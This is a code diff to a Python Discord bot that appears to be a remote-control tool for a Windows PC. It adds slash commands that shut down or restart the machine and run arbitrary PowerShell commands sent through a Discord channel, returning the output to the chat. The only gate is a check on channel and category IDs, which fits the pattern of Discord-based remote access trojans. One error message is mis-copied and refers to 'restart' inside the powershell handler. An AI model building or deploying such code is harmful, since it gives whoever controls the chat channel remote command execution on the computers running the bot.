@@ -59,7 +59,6 @@ async def on_ready():
 @slash_command(
     name="cmd",
     description="execute a cmd command",
-    #guild_ids=[config["guild_id"]] 
 )
 @slash_option(
     name="command",
@@ -85,6 +84,68 @@ async def cmd(ctx: SlashContext, command: str):
         await ctx.send(f"command output ```{output}```")
     except Exception as e:
         await ctx.send(f"error: {e}")
-
+#shutdown command
+@slash_command(
+    name="shutdown",
+    description="shutdown the pc",
+)
+async def shutdown(ctx: SlashContext):
+    # load all channel ids
+    config_custom = functions.get_ids()
+    # load channel id
+    channel = bot.get_channel(ctx.channel_id)
+    # check category
+    if channel.parent_id != config_custom["category_id"]:
+        return
+    # check if channel == main
+    if ctx.channel_id != config_custom["main_channel_id"]:
+        await ctx.send("shutdown can only be executed in main.")
+        return
+    output = functions.shutdown()
+    await ctx.send(output)
+#restart command
+@slash_command(
+    name="restart",
+    description="restart the pc",
+)
+async def restart(ctx: SlashContext):
+    # load all channel ids
+    config_custom = functions.get_ids()
+    # load channel id
+    channel = bot.get_channel(ctx.channel_id)
+    # check category
+    if channel.parent_id != config_custom["category_id"]:
+        return
+    # check if channel == main
+    if ctx.channel_id != config_custom["main_channel_id"]:
+        await ctx.send("restart can only be executed in main.")
+        return
+    output = functions.restart()
+    await ctx.send(output)
+#powershell command
+@slash_command(
+    name="powershell",
+    description="execute powershell command",
+)
+@slash_option(
+    name="command",
+    description="the command to execute",
+    required=True,
+    opt_type=OptionType.STRING,
+)
+async def powershell(ctx: SlashContext, command: str):
+    # load all channel ids
+    config_custom = functions.get_ids()
+    # load channel id
+    channel = bot.get_channel(ctx.channel_id)
+    # check category
+    if channel.parent_id != config_custom["category_id"]:
+        return
+    # check if channel == main
+    if ctx.channel_id != config_custom["main_channel_id"]:
+        await ctx.send("restart can only be executed in main.")
+        return
+    output = f"command output: ```{functions.powershell(command)}```"
+    await ctx.send(output)
 #start bot
 bot.start(config["token"])
